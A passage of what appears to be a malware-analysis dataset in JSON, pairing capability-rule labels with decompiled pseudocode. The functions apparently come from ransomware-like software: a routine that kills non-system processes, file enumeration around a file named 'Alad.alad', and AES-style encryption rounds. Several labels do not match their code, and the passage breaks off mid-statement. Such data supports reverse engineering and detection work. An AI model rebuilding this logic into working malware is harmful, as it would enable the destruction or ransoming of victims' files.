        "decompiled_code": "\nint32_t __fastcall fcn.004016d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *var_10h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if ((param_1 != 0) && (iVar1 = fcn.00407305(param_1),  iVar1 == 0)) {\n        var_4h = 0;\n        fcn.00406c4d(&var_4h);\n        var_10h = vtable.std::bad_alloc.0;\n        iVar1 = fcn.004083c3(&var_10h, 0x41a3e0);\n    }\n    return iVar1;\n}\n",
        "token_count": 157
    },
    "004044d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004044d0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_8h;\n    uint arg_8h_00;\n    uint lpExitCode;\n    int32_t var_43ch;\n    uint var_438h;\n    int32_t var_430h;\n    uint var_20ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    lpExitCode = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2);\n    var_43ch = iVar2;\n    if (iVar2 != -1) {\n        var_438h = 0x22c;\n        arg_8h = iVar2;\n        iVar3 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar2, &var_438h);\n        pcVar1 = _sym.imp.KERNEL32.dll_OpenProcess;\n        if (iVar3 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                if ((iVar3 != var_430h) && (iVar3 = (*pcVar1)(0x410, 0, var_430h),  iVar3 != 0)) {\n                    iVar4 = (*_sym.imp.PSAPI.DLL_GetModuleFileNameExW)(iVar3, 0, &var_20ch, 0x104);\n                    if ((iVar4 != 0) &&\n                       ((iVar4 = fcn.00407f34(&var_20ch, L\"\\\\Windows\\\\\"),  iVar4 == 0 &&\n                        (iVar4 = (*pcVar1)(1, 0, var_430h),  iVar2 = var_43ch,  iVar4 != 0)))) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(iVar4, &lpExitCode);\n                        (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar4, lpExitCode);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                        iVar2 = var_43ch;\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n                }\n                iVar3 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar2, &var_438h);\n            } while (iVar3 != 0);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            fcn.00406bb6(arg_8h);\n            return;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    fcn.00406bb6(arg_8h_00);\n    return;\n}\n",
        "token_count": 623
    },
    "00405640": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00405640(void)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    uint *puVar6;\n    uint16_t *puVar7;\n    uint uVar8;\n    uint16_t *puVar9;\n    uint *puVar10;\n    bool bVar11;\n    uint in_stack_fffffbd0;\n    uint var_428h;\n    uint var_424h;\n    uint32_t lpNumberOfBytesRead;\n    ushort lpBuffer;\n    uint var_416h;\n    uint16_t var_212h;\n    uint var_210h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    iVar4 = fcn.00407ae0(100000000);\n    if (iVar4 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"Alad.alad\", 0xc0000000, 0, 0, 4, 0x80, 0);\n        *0x41d128 = iVar4;\n        if (iVar4 != -1) {\n            lpNumberOfBytesRead = 0;\n            lpBuffer = 0;\n            fcn.0040c5d0(&var_416h, 0, 0x206);\n            (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 0x250, &lpNumberOfBytesRead, 0);\n            if ((0x40 < lpNumberOfBytesRead) && (piVar5 = fcn.00408112(&lpBuffer, 0x419c08),  piVar5 != NULL)) {\n                iVar4 = 0x41cf20 - piVar5;\n                do {\n                    iVar2 = *piVar5;\n                    *(iVar4 + piVar5) = iVar2;\n                    piVar5 = piVar5 + 1;\n                } while (iVar2 != 0);\n                puVar6 = fcn.00408112(0, 0x419c08);\n                if (puVar6 != NULL) {\n                    puVar10 = 0x41d338;\n                    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar10 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    puVar6 = fcn.00408112(0, 0x419c08);\n                    if (puVar6 != NULL) {\n                        *0x41d388 = *puVar6;\n                        *0x41d38c = puVar6[2];\n                        fcn.00404e10();\n                    }\n                }\n            }\n        }\n        *0x41cf18 = 0;\n        *0x41cf1c = 0;\n        *0x41cf10 = 0;\n        *0x41cf14 = 0;\n        fcn.00404920();\n        fcn.00404920();\n        fcn.00404cc0();\n        while (*0x41d4a0 != NULL) {\n            while (*0x41d4a0 != NULL) {\n                puVar6 = *0x41d4a0 + 1;\n                *0x41d4a0 = **0x41d4a0;\n                fcn.00407a13(&var_210h, 0x104, *puVar6, 0x104);\n                puVar6 = &var_210h;\n                do {\n                    iVar2 = *puVar6;\n                    puVar6 = puVar6 + 2;\n                } while (iVar2 != 0);\n                puVar9 = 0x419ad8;\n                puVar7 = &var_212h + (puVar6 - (&var_210h + 2) >> 1);\n                do {\n                    uVar1 = *puVar7;\n                    bVar11 = uVar1 < *puVar9;\n                    if (uVar1 != *puVar9) {\ncode_r0x00405817:\n                        iVar4 = (1 - bVar11) - (bVar11 != 0);\n                        goto code_r0x0040581c;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = puVar7[1];\n                    bVar11 = uVar1 < puVar9[1];\n                    if (uVar1 != puVar9[1]) goto code_r0x00405817;\n                    puVar7 = puVar7 + 2;\n                    puVar9 = puVar9 + 2;\n                } while (uVar1 != 0);\n                iVar4 = 0;\ncode_r0x0040581c:\n                if (iVar4 != 0) {\n                    fcn.00407fc7(&var_210h, 0x104, 0x419ad8, 0x104);\n                }\n                fcn.00405920();\n            }\n            *0x41d4a0 = *0x41d498;\n            *0x41d498 = NULL;\n        }\n        fcn.004044d0();\n        while (*0x41d49c != NULL) {\n            uVar3 = (*0x41d49c)[1];\n            *0x41d49c = **0x41d49c;\n            lpNumberOfBytesRead = 0;\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar3, 0xc0000000, 0, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar4, &lpNumberOfBytesRead);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                fcn.00405200(uVar3, uVar8, lpNumberOfBytesRead);\n            }\n        }\n        fcn.00404920();\n        fcn.004049f0();\n        if (*0x41d128 != -1) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41d128);\n        }\n    }\n    fcn.00406bb6(in_stack_fffffbd0);\n    return;\n}\n",
        "token_count": 1415
    },
    "00405cf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesRead\n\nvoid __cdecl fcn.00405cf0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint lpNumberOfBytesRead;\n    uint var_bh;\n    uint var_4h;\n    \n    if ((unaff_EBX != -1) && ((arg_ch != 0 || (0x108 < arg_8h)))) {\n        lpNumberOfBytesRead = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n        if (iVar1 != 0) {\n            (*_sym.imp.KERNEL32.dll_ReadFile)();\n        }\n    }\n    fcn.00406bb6(lpNumberOfBytesRead);\n    return;\n}\n",
        "token_count": 177
    },
    "004017c0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017c0(int32_t *arg_8h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint *extraout_EDX;\n    uint32_t uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t *piVar9;\n    uint in_stack_fffff344;\n    int32_t var_cb4h;\n    int32_t var_98ch;\n    int32_t var_664h;\n    int32_t var_660h;\n    int32_t *var_65ch;\n    int32_t var_658h;\n    uint var_654h;\n    uint var_650h;\n    uint var_330h;\n    uint var_32ch;\n    uint32_t var_8h;\n    \n    var_8h = *0x41b0e4 ^ &stack0xfffffffc;\n    var_65ch = arg_8h;\n    arg_8h_00 = fcn.00406bab(*(in_ECX + 0x10));\n    var_658h = fcn.00401040(arg_8h_00);\n    cVar1 = *arg_8h_00;\n    iVar7 = CONCAT31(CONCAT21(CONCAT11(cVar1, arg_8h_00[1]), arg_8h_00[2]), arg_8h_00[3]);\n    var_660h = fcn.00406bab(iVar7);\n    iVar4 = 0;\n    if (iVar7 != 0 && -1 < cVar1) {\n        do {\n            *(iVar4 + var_660h) = arg_8h_00[iVar4 + 4];\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar7);\n    }\n    var_658h = var_658h - iVar7;\n    uVar5 = var_658h - 4;\n    var_664h = fcn.00406bab(uVar5);\n    uVar2 = 0;\n    if (uVar5 != 0) {\n        do {\n            *(uVar2 + var_664h) = arg_8h_00[uVar2 + iVar7 + 4];\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < uVar5);\n    }\n    fcn.00402170();\n    fcn.00402170();\n    puVar6 = &var_650h;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    puVar6 = &var_32ch;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    puVar6 = extraout_EDX;\n    puVar8 = &var_654h;\n    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    puVar6 = &var_98ch;\n    puVar8 = &var_330h;\n    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    piVar9 = var_65ch;\n    for (iVar4 = 200; piVar9 = piVar9 + 1,  iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar9 = 0;\n    }\n    iVar4 = 0;\n    *var_65ch = var_cb4h;\n    if (0 < var_cb4h) {\n        piVar9 = var_65ch;\n        do {\n            piVar9 = piVar9 + 1;\n            *piVar9 = *((&var_654h - var_65ch) + piVar9);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < *var_65ch);\n    }\n    piVar9 = var_65ch + 0xc9;\n    piVar3 = var_65ch + 0xca;\n    for (iVar4 = 200; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    iVar4 = 0;\n    *piVar9 = var_98ch;\n    if (0 < var_98ch) {\n        piVar3 = var_65ch + 0xca;\n        var_65ch = &var_330h - piVar9;\n        do {\n            *piVar3 = *((&var_330h - piVar9) + piVar3);\n            iVar4 = iVar4 + 1;\n            piVar3 = piVar3 + 1;\n        } while (iVar4 < *piVar9);\n    }\n    fcn.00407a08(arg_8h_00);\n    fcn.00407a08(var_660h);\n    fcn.00407a08(var_664h);\n    fcn.00406bb6(in_stack_fffff344);\n    return;\n}\n",
        "token_count": 1278
    },
    "00405f70": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl fcn.00405f70(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    uint32_t *puVar2;\n    uint32_t in_ECX;\n    uint32_t uVar3;\n    uchar *in_EDX;\n    uint32_t uVar4;\n    uint32_t arg_8h_00;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = in_ECX & 0xf;\n    arg_8h_00 = in_ECX;\n    while (uVar3 != 0) {\n        arg_8h_00 = arg_8h_00 + 1;\n        uVar3 = arg_8h_00 & 0xf;\n    }\n    if (in_ECX != 0) {\n        puVar1 = in_EDX;\n        var_18h = in_ECX;\n        do {\n            *puVar1 = puVar1[arg_ch - in_EDX];\n            puVar1 = puVar1 + 1;\n            var_18h = var_18h - 1;\n        } while (var_18h != 0);\n    }\n    if (in_ECX < arg_8h_00) {\n        fcn.0040c5d0(in_EDX + in_ECX, 0, arg_8h_00 - in_ECX);\n    }\n    var_1ch = arg_8h_00 >> 4;\n    if (var_1ch != 0) {\n        puVar2 = in_EDX + 8;\n        do {\n            puVar2[-2] = puVar2[-2] ^ *arg_8h;\n            puVar2[-1] = puVar2[-1] ^ arg_8h[1];\n            *puVar2 = *puVar2 ^ arg_8h[2];\n            puVar2[1] = puVar2[1] ^ arg_8h[3];\n            uVar3 = puVar2[-2];\n            uVar4 = puVar2[-1];\n            var_ch = *puVar2;\n            uVar6 = puVar2[1];\n            var_18h = 0xd;\n            puVar5 = arg_8h + 2;\n            do {\n                puVar2[-2] = *((uVar6 >> 0x18) * 4 + 0x4181d0) ^ *((var_ch >> 0x10 & 0xff) * 4 + 0x417dd0) ^\n                             *((uVar4 >> 8 & 0xff) * 4 + 0x4179d0) ^ *((uVar3 & 0xff) * 4 + 0x4175d0) ^ puVar5[2];\n                puVar2[-1] = *((uVar6 >> 0x10 & 0xff) * 4 + 0x417dd0) ^ *((var_ch >> 8 & 0xff) * 4 + 0x4179d0) ^\n                             *((uVar3 >> 0x18) * 4 + 0x4181d0) ^ *((uVar4 & 0xff) * 4 + 0x4175d0) ^ puVar5[3];\n                *puVar2 = *((uVar6 >> 8 & 0xff) * 4 + 0x4179d0) ^ *((uVar4 >> 0x18) * 4 + 0x4181d0) ^\n                          *((uVar3 >> 0x10 & 0xff) * 4 + 0x417dd0) ^ *((var_ch & 0xff) * 4 + 0x4175d0) ^ puVar5[4];\n                var_18h = var_18h + -1;\n                puVar2[1] = *((var_ch >> 0x18) * 4 + 0x4181d0) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x417dd0) ^\n                            *((uVar3 >> 8 & 0xff) * 4 + 0x4179d0) ^ *((uVar6 & 0xff) * 4 + 0x4175d0) ^ puVar5[5];\n                var_ch = *puVar2;\n                uVar3 = puVar2[-2];\n                uVar4 = puVar2[-1];\n                uVar6 = puVar2[1];\n                puVar5 = puVar5 + 4;\n            } while (var_18h != 0);\n            puVar2[-2] = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar6 >> 0x18], str.cw[var_ch >> 0x10 & 0xff]), \n                                           str.cw[uVar4 >> 8 & 0xff]), str.cw[uVar3 & 0xff]) ^ arg_8h[0x38];\n            puVar2[-1] = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 >> 0x18], str.cw[uVar6 >> 0x10 & 0xff]), \n                                           str.cw[var_ch >> 8 & 0xff]), str.cw[uVar4 & 0xff]) ^ arg_8h[0x39];\n            *puVar2 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 >> 0x18], str.cw[uVar3 >> 0x10 & 0xff]), \n                                        str.cw[uVar6 >> 8 & 0xff]), str.cw[var_ch & 0xff]) ^ arg_8h[0x3a];\n            puVar2[1] = CONCAT31(CONCAT21(CONCAT11(str.cw[var_ch >> 0x18], str.cw[uVar4 >> 0x10 & 0xff]), \n                                          str.cw[uVar3 >> 8 & 0xff]), str.cw[uVar6 & 0xff]) ^ arg_8h[0x3b];\n            puVar2 = puVar2 + 4;\n            var_1ch = var_1ch - 1;\n        } while (var_1ch != 0);\n        fcn.00406bb6(arg_8h_00);\n        return;\n    }\n    fcn.00406bb6(arg_8h_00);\n    return;\n}\n",
        "token_count": 1484
    },
    "00406370": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.00406370(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t *in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    in_ECX[2] = arg_8h[2];\n    in_ECX[3] = arg_8h[3];\n    in_ECX[4] = arg_8h[4];\n    in_ECX[5] = arg_8h[5];\n    var_2ch = 1;\n    var_28h = 2;\n    var_24h = 4;\n    var_20h = 8;\n    var_1ch = 0x10;\n    var_18h = 0x20;\n    var_14h = 0x40;\n    var_10h = 0x80;\n    var_ch = 0x1b;\n    var_8h = 0x36;\n    in_ECX[6] = arg_8h[6];\n    in_ECX[7] = arg_8h[7];\n    puVar2 = in_ECX;\n    uVar5 = 10;\n    do {\n        uVar4 = puVar2[7];\n        var_34h = uVar5 - 2;\n        if ((var_34h & 7) == 0) {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 & 0xff], str.cw[uVar4 >> 0x18]), \n                                      str.cw[(uVar4 >> 8 & 0xff00) >> 8]), str.cw[uVar4 >> 8 & 0xff]) ^\n                    (&var_30h)[var_34h >> 3];\n        }\n        if ((var_34h & 7) == 4) {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 >> 0x18], str.cw[uVar4 >> 0x10 & 0xff]), \n                                      str.cw[uVar4 >> 8 & 0xff]), str.cw[uVar4 & 0xff]);\n        }\n        uVar4 = *puVar2 ^ uVar4;\n        puVar2[8] = uVar4;\n        puVar2[0x44] = uVar4;\n        uVar3 = uVar5 - 1 & 7;\n        if (uVar3 == 0) {\n            uVar1 = uVar4 >> 8;\n            var_34h = uVar1 | uVar4 << 0x18;\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 & 0xff], str.cw[uVar4 >> 0x18]), \n                                      str.cw[(uVar1 & 0xff00) >> 8]), str.cw[uVar1 & 0xff]) ^ (&var_30h)[uVar5 - 1 >> 3]\n            ;\n        }\n        if (uVar3 == 4) {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 >> 0x18], str.cw[uVar4 >> 0x10 & 0xff]), \n                                      str.cw[uVar4 >> 8 & 0xff]), str.cw[uVar4 & 0xff]);\n        }\n        uVar4 = puVar2[1] ^ uVar4;\n        puVar2[9] = uVar4;\n        puVar2[0x45] = uVar4;\n        if ((uVar5 & 7) == 0) {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 & 0xff], str.cw[uVar4 >> 0x18]), \n                                      str.cw[(uVar4 >> 8 & 0xff00) >> 8]), str.cw[uVar4 >> 8 & 0xff]) ^\n                    (&var_30h)[uVar5 >> 3];\n        }\n        if ((uVar5 & 7) == 4) {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 >> 0x18], str.cw[uVar4 >> 0x10 & 0xff]), \n                                      str.cw[uVar4 >> 8 & 0xff]), str.cw[uVar4 & 0xff]);\n        }\n        uVar4 = puVar2[2] ^ uVar4;\n        puVar2[10] = uVar4;\n        puVar2[0x46] = uVar4;\n        var_30h = uVar5 + 1 & 7;\n        if (var_30h == 0) {\n            uVar3 = uVar4 >> 8;\n            var_34h = uVar3 | uVar4 << 0x18;\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 & 0xff], str.cw[uVar4 >> 0x18]), \n                                      str.cw[(uVar3 & 0xff00) >> 8]), str.cw[uVar3 & 0xff]) ^ (&var_30h)[uVar5 + 1 >> 3]\n            ;\n        }\n        if (var_30h == 4) {\n            uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar4 >> 0x18], str.cw[uVar4 >> 0x10 & 0xff]), \n                                      str.cw[uVar4 >> 8 & 0xff]), str.cw[uVar4 & 0xff]);\n        }\n        puVar2[0xb] = puVar2[3] ^ uVar4;\n        puVar2[0x47] = puVar2[3] ^ uVar4;\n        uVar4 = uVar5 + 2;\n        puVar2 = puVar2 + 4;\n        uVar5 = uVar5 + 4;\n    } while (uVar4 < 0x3c);\n    in_ECX[0x3c] = *in_ECX;\n    in_ECX[0x3d] = in_ECX[1];\n    in_ECX[0x3e] = in_ECX[2];\n    in_ECX[0x3f] = in_ECX[3];\n    in_ECX[0x40] = in_ECX[4];\n    in_ECX[0x41] = in_ECX[5];\n    in_ECX[0x42] = in_ECX[6];\n    in_ECX[0x43] = in_ECX[7];\n    iVar6 = 0xd;\n    do {\n        fcn.004068e0();\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    fcn.00406bb6(var_34h);\n    return;\n}\n",
        "token_count": 1709
    },
    "004068e0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.004068e0(void)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t unaff_ESI;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar7 = 0;\n    do {\n        uVar1 = *(unaff_ESI + 2 + iVar7 * 4);\n        uVar2 = *(unaff_ESI + 3 + iVar7 * 4);\n        uVar3 = *(unaff_ESI + iVar7 * 4);\n        uVar4 = *(unaff_ESI + 1 + iVar7 * 4);\n        uVar5 = *(str.cw[uVar3] * 4 + 0x4185d0) ^ str.PAeS[str.cw[uVar4] * 4] ^ *(str.cw[uVar2] * 4 + 0x4185d1) ^\n                *(str.cw[uVar1] * 4 + 0x4185d2);\n        *(unaff_ESI + iVar7 * 4) = uVar5;\n        uVar6 = CONCAT11(*(str.cw[uVar4] * 4 + 0x4185d0) ^ *(str.cw[uVar3] * 4 + 0x4185d1) ^\n                         *(str.cw[uVar2] * 4 + 0x4185d2) ^ str.PAeS[str.cw[uVar1] * 4], uVar5);\n        *(unaff_ESI + iVar7 * 4) = uVar6;\n        uVar8 = CONCAT12(*(str.cw[uVar3] * 4 + 0x4185d2) ^ *(str.cw[uVar4] * 4 + 0x4185d1) ^ str.PAeS[str.cw[uVar2] * 4]\n                         ^ *(str.cw[uVar1] * 4 + 0x4185d0), uVar6);\n        *(unaff_ESI + iVar7 * 4) = uVar8;\n        iVar7 = iVar7 + 1;\n        *(unaff_ESI + -4 + iVar7 * 4) =\n             (str.PAeS[str.cw[uVar3] * 4] ^ *(str.cw[uVar4] * 4 + 0x4185d2) ^ *(str.cw[uVar1] * 4 + 0x4185d1) ^\n             *(str.cw[uVar2] * 4 + 0x4185d0)) << 0x18 | uVar8;\n    } while (iVar7 < 4);\n    return;\n}\n",
        "token_count": 668
    },
    "00401ec0": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00401ec0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t *in_ECX;\n    int32_t iVar2;\n    float10 fVar3;\n    float10 fVar4;\n    uint in_stack_00000008;\n    uint var_4h;\n    \n    if (*in_ECX == 0x270) {\n        fcn.00402020();\n    }\n    else if (0x4df < *in_ECX) {\n        fcn.00401f60();\n    }\n    uVar1 = in_ECX[*in_ECX + 1];\n    *in_ECX = *in_ECX + 1;\n    uVar1 = uVar1 ^ in_ECX[0x4e1] & uVar1 >> 0xb;\n    uVar1 = uVar1 ^ (uVar1 & 0xff3a58ad) << 7;\n    uVar1 = uVar1 ^ (uVar1 & 0xffffdf8c) << 0xf;\n    iVar2 = (uVar1 >> 0x12 ^ uVar1) - in_EAX;\n    fVar3 = iVar2;\n    if (iVar2 < 0) {\n        fVar3 = fVar3 + *0x419cc0;\n    }\n    fVar4 = in_EAX;\n    if (in_EAX < 0) {\n        fVar4 = fVar4 + *0x419cc0;\n    }\n    return fVar3 / ((*0x419cb8 - fVar4) + CONCAT44(in_stack_00000008, arg_8h));\n}\n",
        "token_count": 371
    },
    "00402b20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00402b20(void)\n\n{\n    uint32_t uVar1;\n    unkuint3 Var4;\n    int32_t iVar2;\n    int32_t *piVar5;\n    int32_t *unaff_ESI;\n    int32_t *unaff_EDI;\n    int32_t iVar3;\n    \n    uVar1 = unaff_EDI[200] & 0x80000000;\n    Var4 = uVar1 >> 8;\n    if ((uVar1 != 0) && ((unaff_ESI[200] & 0x80000000U) == 0)) {\n        return Var4 << 8;\n    }\n    if ((uVar1 == 0) && ((unaff_ESI[200] & 0x80000000U) != 0)) {\n        return CONCAT31(Var4, 1);\n    }\n    iVar3 = *unaff_EDI;\n    if (*unaff_EDI <= *unaff_ESI) {\n        iVar3 = *unaff_ESI;\n    }\n    iVar2 = iVar3 + -1;\n    if (-1 < iVar2) {\n        piVar5 = unaff_ESI + iVar3;\n        do {\n            if (*((unaff_EDI - unaff_ESI) + piVar5) != *piVar5) {\n                if (iVar2 < 0) {\n                    return 0;\n                }\n                if (unaff_EDI[iVar2 + 1] < unaff_ESI[iVar2 + 1] || unaff_EDI[iVar2 + 1] == unaff_ESI[iVar2 + 1]) {\n                    return 0;\n                }\n                return 1;\n            }\n            piVar5 = piVar5 + -1;\n            iVar2 = iVar2 + -1;\n        } while (-1 < iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 407
    },
    "00402b90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00402b90(void)\n\n{\n    uint32_t uVar1;\n    unkuint3 Var4;\n    int32_t iVar2;\n    int32_t *piVar5;\n    int32_t *unaff_ESI;\n    int32_t *unaff_EDI;\n    int32_t iVar3;\n    \n    uVar1 = unaff_EDI[200] & 0x80000000;\n    Var4 = uVar1 >> 8;\n    if ((uVar1 != 0) && ((unaff_ESI[200] & 0x80000000U) == 0)) {\n        return CONCAT31(Var4, 1);\n    }\n    if ((uVar1 == 0) && ((unaff_ESI[200] & 0x80000000U) != 0)) {\n        return Var4 << 8;\n    }\n    iVar3 = *unaff_EDI;\n    if (*unaff_EDI <= *unaff_ESI) {\n        iVar3 = *unaff_ESI;\n    }\n    iVar2 = iVar3 + -1;\n    if (-1 < iVar2) {\n        piVar5 = unaff_ESI + iVar3;\n        do {\n            if (*((unaff_EDI - unaff_ESI) + piVar5) != *piVar5) {\n                if (iVar2 < 0) {\n                    return 0;\n                }\n                if (unaff_ESI[iVar2 + 1] <= unaff_EDI[iVar2 + 1]) {\n                    return 0;\n                }\n                return 1;\n            }\n            piVar5 = piVar5 + -1;\n            iVar2 = iVar2 + -1;\n        } while (-1 < iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 385
    },
    "004012f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012f0(void)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    int32_t **ppiVar2;\n    int32_t **unaff_ESI;\n    int32_t *unaff_EDI;\n    \n    if (in_EAX != NULL) {\n        piVar1 = unaff_ESI[5];\n        ppiVar2 = unaff_ESI;\n        if (0xf < piVar1) {\n            ppiVar2 = *unaff_ESI;\n        }\n        if (ppiVar2 <= in_EAX) {\n            ppiVar2 = unaff_ESI;\n            if (0xf < piVar1) {\n                ppiVar2 = *unaff_ESI;\n            }\n            if (in_EAX < unaff_ESI[4] + ppiVar2) {\n                if (0xf < piVar1) {\n                    fcn.00401410(unaff_ESI);\n                    return;\n                }\n                fcn.00401410(unaff_ESI);\n                return;\n            }\n        }\n    }\n    if (unaff_EDI == 0xffffffff) {\n        fcn.00406aad(\"string too long\");\n    }\n    if (unaff_ESI[5] < unaff_EDI) {\n        fcn.004014f0();\n        if (unaff_EDI == NULL) {\n            return;\n        }\n    }\n    else if (unaff_EDI == NULL) {\n        unaff_ESI[4] = NULL;\n        if (0xf < unaff_ESI[5]) {\n            **unaff_ESI = 0;\n            return;\n        }\n        *unaff_ESI = 0;\n        return;\n    }\n    ppiVar2 = unaff_ESI;\n    if (0xf < unaff_ESI[5]) {\n        ppiVar2 = *unaff_ESI;\n    }\n    fcn.0040d0f0(ppiVar2, in_EAX, unaff_EDI);\n    unaff_ESI[4] = 